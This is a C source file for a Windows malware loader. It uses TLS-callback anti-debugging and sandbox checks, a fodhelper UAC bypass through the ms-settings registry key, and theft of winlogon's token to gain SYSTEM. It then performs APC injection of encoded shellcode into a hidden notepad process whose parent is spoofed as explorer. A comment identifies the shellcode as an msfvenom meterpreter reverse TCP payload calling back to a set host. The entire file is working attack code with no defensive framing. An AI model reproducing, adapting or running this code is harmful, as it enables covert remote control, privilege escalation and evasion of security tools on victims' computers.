#include <stdio.h>
#include <windows.h>
#include <TlHelp32.h>
#pragma comment(linker,"/subsystem:\"Windows\" /ENTRY:\"mainCRTStartup\"")




VOID NTAPI TlsCallBackCheckDbugger(PVOID DllHandle, DWORD dwReason, PVOID Reserved)
{
    
    if (dwReason == DLL_PROCESS_ATTACH)
    {
        //Check Debugger
        if (IsDebuggerPresent()) TerminateProcess(GetCurrentProcess(), NULL);

        BOOL isDebugger = FALSE;
        CheckRemoteDebuggerPresent(GetCurrentProcess(), &isDebugger);
        if (isDebugger) TerminateProcess(GetCurrentProcess(), NULL);

        PDWORD pFlags = (PDWORD)((PBYTE)GetProcessHeap() + 0x70);
        PDWORD pForceFlags = (PDWORD)((PBYTE)GetProcessHeap() + 0x74);
        if (*pFlags ^ HEAP_GROWABLE  ||  *pForceFlags != 0) TerminateProcess(GetCurrentProcess(), NULL);


        //Check is VirtualMachine
        MEMORYSTATUSEX mStatus;
        mStatus.dwLength = sizeof(mStatus);
        GlobalMemoryStatusEx(&mStatus);
        DWORD RAMMB = mStatus.ullTotalPhys / 1024 / 1024;
        if (RAMMB < 2048)  TerminateProcess(GetCurrentProcess(), NULL);

        HANDLE hDevice = CreateFileW(L"\\.\PhysicalDrive0", 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
        DISK_GEOMETRY pDiskGeometry;
        DWORD bytesReturned;
        DeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0, &pDiskGeometry, sizeof(pDiskGeometry), &bytesReturned, (LPOVERLAPPED)NULL);
        DWORD diskSizeGB;
        diskSizeGB = pDiskGeometry.Cylinders.QuadPart * (ULONG)pDiskGeometry.TracksPerCylinder * (ULONG)pDiskGeometry.SectorsPerTrack * (ULONG)pDiskGeometry.BytesPerSector / 1024 / 1024 / 1024;
        if (diskSizeGB < 100) TerminateProcess(GetCurrentProcess(), NULL);

    }

}
#pragma comment (linker, "/INCLUDE:_tls_used")
#pragma comment (linker, "/INCLUDE:_tls_callback") 



EXTERN_C
#pragma const_seg (".CRT$XLB")
const PIMAGE_TLS_CALLBACK _tls_callback = TlsCallBackCheckDbugger;
#pragma const_seg ()


#define ACCESS_READ  1
#define ACCESS_WRITE 2

BOOL IsAdmin(void) {

    HANDLE hToken;
    DWORD  dwStatus;
    DWORD  dwAccessMask;
    DWORD  dwAccessDesired;
    DWORD  dwACLSize;
    DWORD  dwStructureSize = sizeof(PRIVILEGE_SET);
    PACL   pACL = NULL;
    PSID   psidAdmin = NULL;
    BOOL   bReturn = FALSE;

    PRIVILEGE_SET   ps;
    GENERIC_MAPPING GenericMapping;

    PSECURITY_DESCRIPTOR     psdAdmin = NULL;
    SID_IDENTIFIER_AUTHORITY SystemSidAuthority = SECURITY_NT_AUTHORITY;

    __try {

        ImpersonateSelf(SecurityImpersonation);

        if (!OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, FALSE,
            &hToken)) {

            if (GetLastError() != ERROR_NO_TOKEN)
                __leave;

            if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY,
                &hToken))
                __leave;
        }

        if (!AllocateAndInitializeSid(&SystemSidAuthority, 2,
            SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
            0, 0, 0, 0, 0, 0, &psidAdmin))
            __leave;

        psdAdmin = LocalAlloc(LPTR, SECURITY_DESCRIPTOR_MIN_LENGTH);
        if (psdAdmin == NULL)
            __leave;

        if (!InitializeSecurityDescriptor(psdAdmin,
            SECURITY_DESCRIPTOR_REVISION))
            __leave;

        dwACLSize = sizeof(ACL) + sizeof(ACCESS_ALLOWED_ACE) +
            GetLengthSid(psidAdmin) - sizeof(DWORD);

        pACL = (PACL)LocalAlloc(LPTR, dwACLSize);
        if (pACL == NULL)
            __leave;

        if (!InitializeAcl(pACL, dwACLSize, ACL_REVISION2))
            __leave;

        dwAccessMask = ACCESS_READ | ACCESS_WRITE;

        if (!AddAccessAllowedAce(pACL, ACL_REVISION2,
            dwAccessMask, psidAdmin))
            __leave;

        if (!SetSecurityDescriptorDacl(psdAdmin, TRUE, pACL, FALSE))
            __leave;

        SetSecurityDescriptorGroup(psdAdmin, psidAdmin, FALSE);
        SetSecurityDescriptorOwner(psdAdmin, psidAdmin, FALSE);

        if (!IsValidSecurityDescriptor(psdAdmin))
            __leave;

        dwAccessDesired = ACCESS_READ;

        GenericMapping.GenericRead = ACCESS_READ;
        GenericMapping.GenericWrite = ACCESS_WRITE;
        GenericMapping.GenericExecute = 0;
        GenericMapping.GenericAll = ACCESS_READ | ACCESS_WRITE;

        if (!AccessCheck(psdAdmin, hToken, dwAccessDesired,
            &GenericMapping, &ps, &dwStructureSize, &dwStatus,
            &bReturn)) {
            __leave;
        }

        RevertToSelf();

    }
    __finally {

        if (pACL) LocalFree(pACL);
        if (psdAdmin) LocalFree(psdAdmin);
        if (psidAdmin) FreeSid(psidAdmin);
    }

    return bReturn;
}

DWORD FindProcessPID(const wchar_t* ProcessName) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 process = { 0 };
    process.dwSize = sizeof(process);

    if (Process32First(snapshot, &process)) {
        do {
            if (!wcscmp((const wchar_t*)process.szExeFile, (const wchar_t*)ProcessName))
                break;
        } while (Process32Next(snapshot, &process));
    }

    CloseHandle(snapshot);
    return process.th32ProcessID;
}



BOOL SePrivTokenrivilege(
    HANDLE hToken,
    LPCTSTR lpszPrivilege,
    BOOL bEnablePrivilege
)
{
    LUID luid;

    if (!LookupPrivilegeValue(
        NULL,
        lpszPrivilege,
        &luid))
    {
        return FALSE;
    }

    TOKEN_PRIVILEGES PrivToken;
    PrivToken.PrivilegeCount = 1;
    PrivToken.Privileges[0].Luid = luid;
    if (bEnablePrivilege)
        PrivToken.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    else
        PrivToken.Privileges[0].Attributes = 0;


    if (!AdjustTokenPrivileges(
        hToken,
        FALSE,
        &PrivToken,
        sizeof(TOKEN_PRIVILEGES),
        (PTOKEN_PRIVILEGES)NULL,
        (PDWORD)NULL))
    {
        return FALSE;
    }

    return TRUE;
}



BOOL CurrentUserIsLocalSystem()
{
    BOOL bIsLocalSystem = FALSE;
    PSID psidLocalSystem;
    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;

    BOOL fSuccess = AllocateAndInitializeSid(&ntAuthority, 1, SECURITY_LOCAL_SYSTEM_RID,
        0, 0, 0, 0, 0, 0, 0, &psidLocalSystem);
    if (fSuccess)
    {
        fSuccess = CheckTokenMembership(0, psidLocalSystem, &bIsLocalSystem);
        FreeSid(psidLocalSystem);
    }
    return bIsLocalSystem;
}

unsigned char shellcode[] = (
"\xeb\x27\x5b\x53\x5f\xb0\xec\xfc\xae\x75\xfd\x57\x59\x53\x5e"
"\x8a\x06\x30\x07\x48\xff\xc7\x48\xff\xc6\x66\x81\x3f\x9a\xa1"
"\x74\x07\x80\x3e\xec\x75\xea\xeb\xe6\xff\xe1\xe8\xd4\xff\xff"
"\xff\x02\x09\x01\xec\xe9\x2e\x5a\x51\x56\xb1\xd6\xf5\xaf\x77"
"\xf4\x56\x5b\x5a\x5f\x88\x0f\x31\x05\x41\xfe\xc5\x41\xfe\xc4"
"\x6f\x80\x3d\xeb\xfd\x76\x0e\x81\x3c\xdd\x74\xe8\xe2\xe7\xfd"
"\xe8\xe9\xd6\xf6\xfe\xfd\x08\x03\x0b\xdd\xeb\x27\x5b\x53\x5f"
"\xb0\x3c\xfc\xae\x75\xfd\x57\x59\x53\x5e\x8a\x06\x30\x07\x48"
"\xff\xc7\x48\xff\xc6\x66\x81\x3f\x09\x15\x74\x07\x80\x3e\x3c"
"\x75\xea\xeb\xe6\xff\xe1\xe8\xd4\xff\xff\xff\x09\x30\x02\x3c"
"\xe2\x17\x59\x5a\x6f\xb2\x7e\xcc\xac\x7c\xcd\x55\x50\x63\x5c"
"\x83\x36\x32\x0e\x78\xfd\xce\x78\xfd\xcf\x56\x83\x36\x3f\x18"
"\x7d\x37\x82\x37\x47\x77\xe3\xdb\xe4\xf6\xd1\xea\xdd\xcf\xfd"
"\xf6\x32\x0b\x0f\x47\xeb\x27\x6d\x53\x5f\x86\xca\xfc\x98\x75"
"\xfd\x61\x59\x53\x68\x8a\x06\x06\x07\x48\xc9\xc7\x48\xc9\xc6"
"\x66\xb7\x3f\x41\x9b\x74\x07\xb6\x3e\xca\x43\xea\xeb\xd0\xff"
"\xe1\xde\xd4\xff\xc9\xff\x06\x34\x07\xca\xdb\x25\x5c\x63\x5d"
"\xb7\xc6\xfe\xa9\x45\xff\x50\x69\x51\x59\xba\x04\x37\x37\x4a"
"\xf8\xf7\x4a\xf8\xf6\x64\x86\x0f\x30\xc5\x44\x05\x87\x0e\xf4"
"\x72\xda\xe9\xe1\xcf\xe3\xef\xe4\xfd\xf8\xcf\x10\x17\x20\xf4"
"\xfe\x07\x49\x46\x7f\xa2\xf1\xdc\xbc\x60\xdd\x45\x4c\x73\x4c"
"\x9f\x26\x22\x12\x68\xed\xd2\x68\xed\xd3\x46\x93\x2a\x1a\x2c"
"\x61\x27\x92\x2b\xc4\x67\xff\xcb\xf4\xea\xc1\xfa\xc1\xdf\xed"
"\xea\x22\x13\xf1\xc9\x34\x4c\x72\x4f\xa4\x4e\xef\xb9\x54\xed"
"\x43\x7b\x40\x49\xab\x16\x24\x25\x5b\xe8\xe6\x58\xeb\xe4\x75"
"\x96\x1e\x9d\xde\x56\x14\x97\x1f\x7c\x61\xc8\xf8\xf1\xde\xf1"
"\xfc\xf6\xec\xe8\xde\x11\x16\x4e\xf9\x32\x7b\x41\x4a\x90\xfe"
"\xe9\x8e\x67\xe8\x77\x4b\x46\x7e\x98\x13\x10\x15\x5d\xdf\xd5"
"\x5d\xdf\xd4\x73\xa1\x2d\xc2\xd7\x66\x12\xa0\x2c\xf9\x55\xf8"
"\xfe\xc6\xed\xf4\xc8\xc6\xea\xdf\xed\x17\x21\xfe\xfc\x06\x4b"
"\x47\x7d\xa3\x78\xdd\xbe\x61\xdf\x44\x4e\x72\x4e\x9e\x24\x23"
"\x10\x69\xef\xd3\x6a\xec\xd1\x47\x91\x2b\x5d\xb2\x63\x26\x90"
"\x2a\x4d\x66\xfd\xca\xf6\xeb\xc3\xfb\xc3\xde\xef\xeb\x23\x11"
"\x78\xcb\x35\x4e\x73\x4d\xa5\x4f\xee\xbb\x55\xef\x42\x79\x41"
"\x4b\xaa\x14\x25\x27\x5a\xea\xe7\x5a\xea\xe6\x74\x94\x1f\x1b"
"\x78\x54\x15\x95\x1e\x7d\x60\xca\xf9\xf3\xdf\xf3\xfd\xf4\xed"
"\xea\xdf\x10\x14\x4f\xfb\x33\x79\x40\x48\x91\x7c\xe8\x8c\x66"
"\xea\x76\x49\x47\x7c\x99\x11\x11\x17\x5c\xdd\xd4\x5f\xde\xd6"
"\x72\xa3\x2c\x60\x53\x64\x13\xa2\x2d\x7b\x54\xfa\xff\xc4\xec"
"\xf6\xc9\xc4\xeb\xdd\xec\x16\x23\x7c\xfe\x07\x49\x46\x7f\xa2"
"\x0c\xdc\xbc\x60\xdd\x45\x4c\x73\x4c\x9f\x26\x22\x12\x68\xed"
"\xd2\x68\xed\xd3\x46\x93\x2a\x7a\x37\x61\x27\x92\x2b\x39\x67"
"\xff\xcb\xf4\xea\xc1\xfa\xc1\xdf\xed\xea\x04\x0b\xda\x23\x6d"
"\x62\x5b\x86\x9c\xf8\x98\x44\xf9\x61\x68\x57\x68\xbb\x02\x06"
"\x36\x4c\xc9\xf6\x4c\xc9\xf7\x62\xb7\x0e\x83\x05\x45\x03\xb6"
"\x0f\xa9\x43\xdb\xef\xd0\xce\xe5\xde\xe5\xfb\xc9\xce\x17\x9b"
"\xde\x5f\xa6\xc6\xe7\xcd\xee\x17\x25\x22\x56\x74\x63\x47\x77"
"\x73\x41\x6d\x13\xc5\x40\x6a\x9c\x77\x42\x5f\xae\x70\x0f\x6d"
"\xa9\x45\x05\x6a\x9c\x57\x72\x5f\x2a\x95\x5d\x6f\x6f\x26\xec"
"\x6a\x26\xe5\x8e\x2b\x44\x5e\x15\x09\x02\x56\xe4\xeb\x1a\x64"
"\x23\xd6\xc7\xcf\x45\x64\x73\x5f\xae\x70\x37\xae\x60\x2b\x6d"
"\x23\xc7\x43\xa3\x6f\x3d\x29\x15\x2a\xa7\x65\x25\x22\x17\xae"
"\xa2\x9f\x25\x22\x17\x6d\xa7\xd7\x51\x45\x5f\x24\xf2\x47\xae"
"\x6a\x0f\x61\xa9\x57\x05\x6b\x16\xf5\xc1\x41\x6d\xdd\xde\x64"
"\xa9\x23\xad\x6a\x16\xf3\x6f\x26\xec\x6a\x26\xe5\x8e\x56\xe4"
"\xeb\x1a\x64\x23\xd6\x1d\xc2\x62\xd4\x6e\x14\x69\x06\x1f\x60"
"\x1b\xc6\x50\xfa\x4f\x61\xa9\x57\x01\x6b\x16\xf5\x44\x56\xae"
"\x2e\x5f\x61\xa9\x57\x39\x6b\x16\xf5\x63\x9c\x21\xaa\x5f\x24"
"\xf2\x56\x7d\x63\x4f\x7b\x7b\x4d\x64\x7a\x56\x7c\x63\x4d\x6d"
"\xa1\xfb\x05\x63\x45\xda\xc2\x4f\x64\x7b\x4d\x6d\xa9\x05\xcc"
"\x69\xe8\xda\xdd\x4a\x6c\x9c\x60\x56\x10\x48\x16\x10\x17\x25"
"\x63\x41\x6c\xab\xf1\x6d\xa3\xfb\x85\x23\x17\x25\x6b\x9e\xc0"
"\x6b\xab\x27\x22\x06\x79\xe2\xbf\x9f\xa2\x56\x71\x6b\x9e\xc1"
"\x6e\x9e\xd4\x63\xad\x69\x55\x31\x22\xdd\xc2\x69\xab\xfd\x4d"
"\x23\x16\x25\x22\x4e\x64\x98\x3e\xa5\x49\x17\xda\xf7\x7d\x2f"
"\x63\x49\x75\x72\x5a\x14\xeb\x5a\x14\xe2\x5f\xda\xe2\x5f\xac"
"\xe0\x5f\xda\xe2\x5f\xac\xe3\x56\x9f\xc8\x18\xfa\xc2\xe8\xf0"
"\x6a\x9e\xe2\x48\x07\x64\x7a\x5b\xac\xc0\x5f\xac\xdb\x56\x9f"
"\xbb\xb2\x51\x43\xe8\xf0\xa7\xd7\x51\x28\x5e\xda\xec\x62\xc0"
"\xca\x84\x25\x22\x17\x6d\xa1\xfb\x35\x6a\x9e\xc7\x6f\x26\xec"
"\x48\x13\x64\x7a\x5f\xac\xdb\x56\x9f\x20\xce\xed\x7d\xe8\xf0"
"\xa1\xef\x25\x5c\x42\x6d\xa1\xd3\x05\x7c\x9e\xd3\x48\x57\x64"
"\x7b\x7f\x25\x32\x17\x25\x63\x4f\x6d\xab\xe5\x6d\x13\xde\x64"
"\x98\x4f\x81\x71\xf2\xda\xf7\x5f\xac\xe1\x5e\xac\xe5\x5a\x14"
"\xeb\x5e\xac\xd2\x5f\xac\xf8\x5f\xac\xdb\x56\x9f\x20\xce\xed"
"\x7d\xe8\xf0\xa1\xef\x25\x5f\x3f\x7d\x63\x40\x7c\x4a\x17\x65"
"\x22\x17\x64\x7a\x7d\x25\x78\x56\x9f\x29\x38\x2a\x12\xe8\xf0"
"\x75\x4e\x64\x98\x62\x4b\x6f\x76\xda\xf7\x5e\xda\xec\xfe\x19"
"\xdd\xe8\xda\x6a\x16\xe6\x6a\x3e\xe3\x6a\x92\xd3\x57\xa3\x64"
"\xdd\xf0\x7d\x48\x17\x7c\x99\xf7\x38\x08\x1d\x64\xab\xcd\xda"
"\xf7\x83\x05\x4f\x05\x67\x66\x29\x7f\x68\x80\xc5\xe2\xaf\xd9"
"\x2f\x1e\x30\xc5\x77\xad\x06\x2a\x09\x15\xe3\xfe\x9a\xa1");

int main() {

    //msfvenom -p windows/x64/meterpreter/reverse_tcp -e x64/xor_dynamic -i 14 LHOST=192.168.0.109 EXITFUNC=thread -f

    if (IsAdmin())
    {
        if (CurrentUserIsLocalSystem())
        {
            int ret;
            STARTUPINFOEXA siex = { 0 };
            PROCESS_INFORMATION piex = { 0 };
            SIZE_T sizeT;
            HANDLE hSystemToken = NULL;
            OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hSystemToken);

            siex.StartupInfo.cb = sizeof(STARTUPINFOEXA);
            HANDLE expHandle = OpenProcess(PROCESS_ALL_ACCESS, false, FindProcessPID(L"explorer.exe"));
            InitializeProcThreadAttributeList(NULL, 1, 0, &sizeT);
            siex.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, sizeT);
            InitializeProcThreadAttributeList(siex.lpAttributeList, 1, 0, &sizeT);
            UpdateProcThreadAttribute(siex.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &expHandle, sizeof(HANDLE), NULL, NULL);
            SetCurrentDirectoryA("C:\\Windows\\System32\\");
            //CreateProcessAsUserA(hSystemToken, "C:\\Windows\\System32\\cmd.exe",
            CreateProcessAsUserA(hSystemToken, "C:\\Windows\\System32\\notepad.exe",
                NULL, NULL, NULL, TRUE,
                CREATE_SUSPENDED | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT,
                //EXTENDED_STARTUPINFO_PRESENT,
                NULL,
                NULL,
                (LPSTARTUPINFOA)&siex,
                &piex);
            LPVOID lpBaseAddress = (LPVOID)VirtualAllocEx(piex.hProcess, NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            ret = GetLastError();
            WriteProcessMemory(piex.hProcess, lpBaseAddress, (LPVOID)shellcode, sizeof(shellcode), NULL);
            QueueUserAPC((PAPCFUNC)lpBaseAddress, piex.hThread, NULL);
            ResumeThread(piex.hThread);
            CloseHandle(piex.hThread);


            return 0;
        }
        else
        {
            HANDLE hToken = NULL;


            HANDLE hDpToken = NULL;



            HANDLE hCurrentToken = NULL;
            BOOL getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hCurrentToken);
            SePrivTokenrivilege(hCurrentToken, L"SeDebugPrivilege", TRUE);

            DWORD PID_TO_IMPERSONATE = FindProcessPID(L"winlogon.exe");
            HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, true, PID_TO_IMPERSONATE);



            BOOL TokenRet = OpenProcessToken(hProcess,
                TOKEN_DUPLICATE |
                TOKEN_ASSIGN_PRIMARY |
                TOKEN_QUERY, &hToken);

            BOOL impersonateUser = ImpersonateLoggedOnUser(hToken);
            if (GetLastError() == NULL)
            {
                RevertToSelf();
            }


            BOOL dpToken = DuplicateTokenEx(hToken,
                TOKEN_ADJUST_DEFAULT |
                TOKEN_ADJUST_SESSIONID |
                TOKEN_QUERY |
                TOKEN_DUPLICATE |
                TOKEN_ASSIGN_PRIMARY,
                NULL,
                SecurityImpersonation,
                TokenPrimary,
                &hDpToken
            );

            STARTUPINFOW si = { 0 };
            PROCESS_INFORMATION pi = { 0 };
            si.cb = sizeof(STARTUPINFOEXW);
            wchar_t szPath[MAX_PATH + 1] = { 0 };
            GetModuleFileNameW(NULL, szPath, MAX_PATH);
            BOOL Ret =
                CreateProcessWithTokenW(hDpToken,
                    LOGON_WITH_PROFILE,
                    szPath,
                    NULL,
                    CREATE_NO_WINDOW,
                    NULL,
                    NULL,
                    &si,
                    &pi);
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
            return 0;
        }


    }
    else {
        PROCESS_INFORMATION pi = { 0 };
        STARTUPINFOA si = { 0 };
        HKEY hKey;


        char szPath[MAX_PATH + 1] = { 0 };
        GetModuleFileNameA(NULL, szPath, MAX_PATH);

        si.cb = sizeof(STARTUPINFO);
        si.wShowWindow = SW_HIDE;



        RegCreateKeyA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\Shell\\open\\command", &hKey);
        RegSetValueExA(hKey, "", 0, REG_SZ, (LPBYTE)szPath, sizeof(szPath));
        RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ, (LPBYTE)"", sizeof(""));
        CreateProcessA("C:\\Windows\\System32\\cmd.exe", (LPSTR)"/c C:\\Windows\\System32\\fodhelper.exe", NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS | CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
        Sleep(1000);
        RegDeleteTreeA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings");

        return 0;
    }


}